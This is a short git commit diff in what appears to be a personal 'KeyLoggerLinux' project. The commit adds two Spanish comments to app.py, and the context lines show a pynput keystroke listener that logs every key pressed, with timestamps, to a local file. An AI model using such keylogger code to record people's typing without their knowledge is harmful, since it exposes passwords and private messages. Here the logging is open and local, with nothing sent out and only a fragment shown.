958624b1db9e7ee793bc30f1ecd2238faaaa835b
andremarinmx <andre707.am@gmail.com>
2023-07-13 10:38:56 -0600

    Comentarios

--- app.py
+++ app.py
@@ -1,8 +1,8 @@
 from pynput.keyboard import Key, Listener
 import logging
- 
+# Locacion del archivo 
 logging.basicConfig(filename="Codes/KeyLoggerLinux/test.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
- 
+# Analizar teclado 
 def on_press(key):
     logging.info(str(key))
  
